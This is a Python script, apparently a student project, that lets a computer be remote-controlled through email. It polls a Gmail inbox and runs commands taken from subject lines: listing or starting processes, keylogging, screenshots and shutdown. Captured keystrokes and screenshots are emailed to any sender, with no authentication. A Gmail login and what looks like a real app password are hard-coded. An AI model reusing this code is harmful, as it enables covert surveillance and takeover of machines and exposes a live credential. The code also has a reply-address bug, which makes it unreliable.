#-------------------------------------------------------------------------------------------------
#THINGS WILL BE USED

from email.header import decode_header
import json
import smtplib
import imaplib
import email
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import screenshot
import shutdown
from process_app import execute_msg
from keylogger import key_logger
from rd import Email
from email.header import decode_header

smtp_server = 'smtp.gmail.com'  # SMTP server for Gmail
smtp_port = 587  # Port for TLS

username_checker = 'mangmaytinhremotecontrol@gmail.com'
password_checker = 'lmlx vrwx cwym hvqz'
username_receiver = ""

# CONNECT + LOGIN
imap = imaplib.IMAP4_SSL(host='imap.gmail.com', port=993)
imap.login(username_checker, password_checker)

# SEND MAIL
def send_email(sender, receiver, subject, body, image_data=None):
    msg = MIMEMultipart()
    msg["From"] = sender
    msg["To"] = receiver
    msg["Subject"] = subject
    msg["Reply-To"] = sender  # Thêm trường Reply-To
    msg.attach(MIMEText(body, "plain"))
    if image_data is not None:
        image = MIMEImage(image_data, name="image.png")
        msg.attach(image)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com', 587)

    try:
        server.starttls()
        server.login(username_checker, password_checker)
        server.sendmail(sender, receiver, text)
    except Exception as e:
        print(f"Error sending email: {e}")
    finally:
        server.quit()


# READ MAIL
def CheckAndDo(cmd):
    if cmd == 'applications':
        print("Applications")
        send_email(username_checker, username_receiver,
                   "List of applications:", execute_msg(cmd))
    elif cmd == 'processes':
        print("Processes")
        send_email(username_checker, username_receiver,
                   "List of processes:", execute_msg(cmd))
    elif 'Start' in cmd:
        send_email(username_checker, username_receiver,
                   "List of processes:", execute_msg(cmd))
    elif cmd == 'keylogger':
        print("Key Logger")
        send_email(username_checker, username_receiver,
                   "Keys pressed:", key_logger())
    elif cmd == 'screenshot':
        print("Screenshot")
        image_data = screenshot.screen_shot()
        send_email(username_checker, username_receiver,
                   "Screenshot Taken!", "See attachment: ", image_data)
    elif cmd == 'shutdown':
        print("Shutdown")
        send_email(username_checker, username_receiver,
                   "Shutting Down PC!", "PC is shutting down...")
        shutdown.shutdown()

def decode_email_header(header):
    decoded_parts = []
    for part, encoding in decode_header(header):
        if isinstance(part, bytes):
            decoded_parts.append(part.decode(encoding or 'utf-8'))
        else:
            decoded_parts.append(part)
    return ''.join(decoded_parts)

def extract_email_address(sender):
    # Assuming the email address is within angle brackets
    start = sender.find('<')
    end = sender.find('>')
    if start != -1 and end != -1:
        return sender[start + 1:end]
    else:
        return sender

def save_emails_to_json(emails, file_path):
    with open(file_path, 'w', encoding='utf-8') as file:
        data = [
            {"sender": extract_email_address(email.sender), "subject": email.subject, "snippet": email.snippet, "read": email.read}
            for email in emails
        ]
        json.dump(data, file, ensure_ascii=False, default=str)

def load_emails_from_json(file_path):
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
            if not data:
                # Danh sách email trống, trả về danh sách rỗng
                return []
            emails = [Email(email["sender"], email["subject"], email["snippet"], email["read"]) for email in data]
            return emails
    except (FileNotFoundError, json.decoder.JSONDecodeError):
        return []

def main():
    cmd = 'start'
    emails = load_emails_from_json('D:\MMT\Project\Email\Remote-Control-Another-Computer-Using-Email-\email.json')

    while cmd != 'quit':
        imap.select("Inbox")
        res, mailIds = imap.search(None, '(UNSEEN)')
        for id in mailIds[0].decode().split():
            res, mailData = imap.fetch(id, '(RFC822)')
            message = email.message_from_string(mailData[0][1].decode())
            cmd = message.get("Subject")
            sender_email = message.get("From")
            username_receiver = sender_email
            new_email = Email(sender=sender_email, subject=cmd, snippet="", read=False)
            emails.append(new_email)  
            CheckAndDo(cmd.lower())

        imap.close()

        time.sleep(0.4)

        # Lưu danh sách tất cả các email vào tệp JSON sau mỗi vòng lặp
        save_emails_to_json(emails, 'D:\MMT\Project\Email\Remote-Control-Another-Computer-Using-Email-\email.json')

    print("Bye !!!")
    imap.logout()

if __name__ == '__main__':
    main()
